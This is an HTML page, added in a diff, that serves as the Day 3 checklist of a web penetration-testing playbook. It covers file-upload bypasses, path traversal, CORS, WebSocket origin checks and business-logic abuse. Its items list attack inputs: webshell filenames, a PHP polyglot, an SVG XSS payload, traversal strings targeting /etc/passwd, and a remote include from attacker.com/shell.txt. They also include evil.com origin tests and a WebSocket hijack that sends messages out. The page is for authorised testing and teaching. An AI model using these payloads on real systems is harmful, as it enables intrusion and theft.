@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Day 3 Worksheet — File Handling &amp; Client-Side. Interactive checklist for the third day of a 5-day web pentest engagement.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff6633' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../vulns/style.css">
+  <title>Day 3 Worksheet · File Handling + Client-Side · Web Pentest Playbook</title>
+</head>
+<body data-day="day3" style="--day-color: var(--purple)">
+
+<svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-folder" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></symbol>
+  </defs>
+</svg>
+
+<nav class="topnav" aria-label="Primary">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2026</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html#vulns" class="nav-link">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="../index.html#day3" class="nav-link active">Worksheets</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+  </div>
+  <div class="nav-right">
+    <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="nav-link" style="font-size:0.78rem;">GitHub</a>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle color theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="content-wrap" style="padding-top:2rem">
+
+  <div class="day-page-hero">
+    <div class="day-num">Worksheet · Day 3 of 5</div>
+    <h1>
+      <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-folder"/></svg></span>
+      File Handling + Client-Side Checks
+    </h1>
+    <p>File-upload endpoints, path-typed parameters, CORS policy, WebSocket origin validation, and the start of business-logic mapping. Still <strong>partial-depth</strong> — confirm the bug exists, defer full exploitation to Day 4.</p>
+    <div class="day-progress">
+      <div class="day-progress-bar-wrap"><div class="day-progress-bar" style="width:0%"></div></div>
+      <div class="day-progress-text"><strong>0</strong> / 0 tasks · <strong>0%</strong> complete</div>
+      <div class="day-progress-saved"></div>
+    </div>
+  </div>
+
+  <section class="worksheet-section" id="context">
+    <h2><span class="ws-section-num">1</span>Today's Context</h2>
+    <div class="form-group">
+      <label for="t-from-day2">Carry-overs from Day 2</label>
+      <textarea id="t-from-day2" data-key="text-from-day2" placeholder="What's still open from yesterday — auth bypasses to retest, role-escalation paths to map, etc."></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="upload">
+    <h2><span class="ws-section-num">2</span>File Upload</h2>
+    <p class="ws-intro">For every upload endpoint: identify all client-side and server-side checks, then bypass each one in turn.</p>
+    <div class="form-group">
+      <label for="t-upload-endpoints">Upload endpoints in scope</label>
+      <textarea id="t-upload-endpoints" data-key="text-upload-endpoints" placeholder="POST /api/avatar — multipart, profile pic&#10;POST /import — CSV import&#10;POST /tickets/{id}/attachment — issue tracker"></textarea>
+    </div>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-up-clientcheck"><span class="task-label">Identify <strong>client-side</strong> checks (JS validation, accept attribute) — bypass by tampering the request directly</span></li>
+      <li><input type="checkbox" data-key="check-up-extension"><span class="task-label">Extension allow/blocklist: try <code>.phtml</code>, <code>.php5</code>, <code>.php7</code>, <code>.shtml</code>, <code>.htaccess</code>, <code>.jsp</code></span></li>
+      <li><input type="checkbox" data-key="check-up-double-ext"><span class="task-label">Double extension: <code>shell.php.jpg</code>, <code>shell.jpg.php</code>, <code>shell.php%00.jpg</code></span></li>
+      <li><input type="checkbox" data-key="check-up-mime"><span class="task-label">MIME type spoofing: keep payload, change <code>Content-Type: image/jpeg</code></span></li>
+      <li><input type="checkbox" data-key="check-up-magic"><span class="task-label">Magic-byte spoofing: prepend <code>GIF89a;</code> or <code>%PDF-1.4</code> before the payload</span></li>
+      <li><input type="checkbox" data-key="check-up-svg"><span class="task-label">SVG with embedded JS: <code>&lt;svg xmlns="..."&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code> — stored XSS if rendered inline</span></li>
+      <li><input type="checkbox" data-key="check-up-polyglot"><span class="task-label">Polyglot (PHP+JPEG, PHP+GIF) — <code>exiftool</code> with <code>-Comment="&lt;?php ... ?&gt;"</code></span></li>
+      <li><input type="checkbox" data-key="check-up-pathtraversal"><span class="task-label">Filename path-traversal: <code>../shell.php</code>, <code>..\shell.aspx</code></span></li>
+      <li><input type="checkbox" data-key="check-up-zipslip"><span class="task-label">If accepts ZIP: zip-slip (<code>../../../tmp/x</code>) or zipbomb</span></li>
+      <li><input type="checkbox" data-key="check-up-where"><span class="task-label">Where does the file land? Public dir? Executable by web server? Direct URL to it?</span></li>
+      <li><input type="checkbox" data-key="check-up-size"><span class="task-label">Size limit: try 10 GB upload to test rate-limit / DoS handling</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="path">
+    <h2><span class="ws-section-num">3</span>Path Traversal</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-path-list"><span class="task-label">List every path-typed parameter (<code>?file=</code>, <code>?page=</code>, <code>?include=</code>, <code>?template=</code>)</span></li>
+      <li><input type="checkbox" data-key="check-path-basic"><span class="task-label">Basic: <code>../../../etc/passwd</code>, <code>..\..\..\windows\win.ini</code></span></li>
+      <li><input type="checkbox" data-key="check-path-encoded"><span class="task-label">URL-encoded: <code>..%2f..%2f..%2fetc%2fpasswd</code></span></li>
+      <li><input type="checkbox" data-key="check-path-double"><span class="task-label">Double-encoded: <code>..%252f..%252fetc%252fpasswd</code></span></li>
+      <li><input type="checkbox" data-key="check-path-unicode"><span class="task-label">Unicode bypass: <code>..%c0%afetc%c0%afpasswd</code> · <code>..%c1%9c</code></span></li>
+      <li><input type="checkbox" data-key="check-path-nullbyte"><span class="task-label">Null-byte truncation: <code>../etc/passwd%00.png</code></span></li>
+      <li><input type="checkbox" data-key="check-path-slash-trick"><span class="task-label"><code>....//</code> · <code>...%2f...%2f</code> (filter strips <code>../</code>)</span></li>
+      <li><input type="checkbox" data-key="check-path-absolute"><span class="task-label">Absolute paths: <code>/etc/passwd</code> (server may concatenate to base dir)</span></li>
+      <li><input type="checkbox" data-key="check-path-rfi"><span class="task-label">Try Remote File Inclusion (RFI): <code>http://attacker.com/shell.txt</code></span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="cors">
+    <h2><span class="ws-section-num">4</span>CORS</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-cors-list-apis"><span class="task-label">List every API endpoint that returns user data (these are the targets)</span></li>
+      <li><input type="checkbox" data-key="check-cors-reflect"><span class="task-label">Test for full reflection: <code>Origin: https://evil.com</code> → <code>Access-Control-Allow-Origin: https://evil.com</code></span></li>
+      <li><input type="checkbox" data-key="check-cors-creds"><span class="task-label">If reflected, check <code>Access-Control-Allow-Credentials: true</code> — = critical</span></li>
+      <li><input type="checkbox" data-key="check-cors-null"><span class="task-label">Test <code>Origin: null</code> (sandboxed iframe / data:URL exploit path)</span></li>
+      <li><input type="checkbox" data-key="check-cors-prefix"><span class="task-label">Prefix bypass: <code>Origin: https://target.com.evil.com</code></span></li>
+      <li><input type="checkbox" data-key="check-cors-suffix"><span class="task-label">Suffix bypass: <code>Origin: https://eviltarget.com</code></span></li>
+      <li><input type="checkbox" data-key="check-cors-subdomain"><span class="task-label">Subdomain trust + XSS on a low-trust subdomain</span></li>
+      <li><input type="checkbox" data-key="check-cors-tls"><span class="task-label">Cleartext-trust: <code>http://target.com</code> reflected on an HTTPS API?</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="websocket">
+    <h2><span class="ws-section-num">5</span>WebSocket</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-ws-find"><span class="task-label">Identify all WebSocket endpoints (Burp WebSockets history tab)</span></li>
+      <li><input type="checkbox" data-key="check-ws-origin"><span class="task-label">Origin validation on the upgrade — drop / change <code>Origin</code> header in Repeater</span></li>
+      <li><input type="checkbox" data-key="check-ws-auth"><span class="task-label">Authentication in messages: are messages independently authenticated, or just the upgrade?</span></li>
+      <li><input type="checkbox" data-key="check-ws-cswsh"><span class="task-label">CSWSH PoC: <code>new WebSocket('wss://target/...')</code> from attacker page, exfiltrate messages</span></li>
+      <li><input type="checkbox" data-key="check-ws-inject"><span class="task-label">Inject XSS / SQLi / CMDi payloads into WebSocket messages</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="biz">
+    <h2><span class="ws-section-num">6</span>Business Logic</h2>
+    <p class="ws-intro">High-impact bugs that don't fit any vuln class — pure logic abuse.</p>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-biz-coupon"><span class="task-label">Coupon / discount code: reuse, stacking, application after total calc, negative values</span></li>
+      <li><input type="checkbox" data-key="check-biz-quantity"><span class="task-label">Negative quantity (refund-as-purchase), zero quantity, fractional quantity</span></li>
+      <li><input type="checkbox" data-key="check-biz-race"><span class="task-label">Race window on purchase / transfer / vote / 2FA-attempt — Turbo Intruder 50× parallel</span></li>
+      <li><input type="checkbox" data-key="check-biz-currency"><span class="task-label">Currency / decimal manipulation (<code>amount=1.999</code> rounds down server-side?)</span></li>
+      <li><input type="checkbox" data-key="check-biz-state-skip"><span class="task-label">State machine skip: jump from step 1 → step 4 in a multi-step flow</span></li>
+      <li><input type="checkbox" data-key="check-biz-self"><span class="task-label">Self-target: send money / vote / friend-request to yourself</span></li>
+      <li><input type="checkbox" data-key="check-biz-mass-assign"><span class="task-label">Hidden-field tampering on update: <code>"is_admin":true</code>, <code>"verified":true</code></span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="findings">
+    <h2><span class="ws-section-num">7</span>Findings</h2>
+    <div class="form-group">
+      <label for="t-confirmed">Confirmed bugs (move to Day 4 deep-dive)</label>
+      <textarea id="t-confirmed" data-key="text-confirmed" placeholder="- POST /api/avatar accepts .phtml; lands at /uploads/{user}/{filename}; PHP executed&#10;- /api/users CORS reflects Origin + Allow-Credentials:true → critical&#10;- Coupon SAVE10 reuses if comma-separated"></textarea>
+    </div>
+    <div class="form-group">
+      <label for="t-leads">Leads needing deeper testing</label>
+      <textarea id="t-leads" data-key="text-leads" placeholder="- /import?file= might be path-traversable, response is 404 but timing changes&#10;- WebSocket /chat doesn't seem to validate Origin"></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="eod">
+    <h2><span class="ws-section-num">✓</span>End of Day Checklist</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-eod-uploads"><span class="task-label">Every upload endpoint tested (or noted as out-of-scope)</span></li>
+      <li><input type="checkbox" data-key="check-eod-paths"><span class="task-label">Every path-typed parameter probed for traversal</span></li>
+      <li><input type="checkbox" data-key="check-eod-cors"><span class="task-label">CORS posture documented for every data API</span></li>
+      <li><input type="checkbox" data-key="check-eod-ws"><span class="task-label">WebSocket origin validation tested (or n/a)</span></li>
+      <li><input type="checkbox" data-key="check-eod-biz"><span class="task-label">Business-logic anomalies documented</span></li>
+    </ul>
+
+    <div class="day-actions">
+      <button id="day-export" type="button">📄 Export as text</button>
+      <button id="day-reset" type="button" class="danger">↺ Reset Day 3 progress</button>
+    </div>
+  </section>
+
+  <nav class="day-nav-buttons" aria-label="Day navigation">
+    <a href="day2.html" class="prev">
+      <span class="nav-label">← Previous</span>
+      <span class="nav-title">Day 2 · Auth + Probes</span>
+    </a>
+    <a href="day4.html" class="next">
+      <span class="nav-label">Next worksheet →</span>
+      <span class="nav-title">Day 4 · Server-Side Deep Dive</span>
+    </a>
+  </nav>
+
+</div>
+
+<footer class="home-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-brand-link">
+          <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+          <span class="footer-brand-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Worksheets</div>
+        <a href="day1.html">Day 1 · Recon</a>
+        <a href="day2.html">Day 2 · Auth + Probes</a>
+        <a href="day3.html">Day 3 · File / Client</a>
+        <a href="day4.html">Day 4 · Server-Side</a>
+        <a href="day5.html">Day 5 · Client + Close</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html">5-Day Playbook</a>
+        <a href="../index.html">All Vulnerabilities</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom-row">
+      <span>© 2026 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by Tomer Hadad</span>
+    </div>
+  </div>
+</footer>
+
+<script src="dayform.js"></script>
+<script>
+  (function(){
+    var t = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+    var btn = document.getElementById('theme-toggle');
+    if(btn){
+      btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+      btn.addEventListener('click', function(){
+        var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', n);
+        localStorage.setItem('theme', n);
+        btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
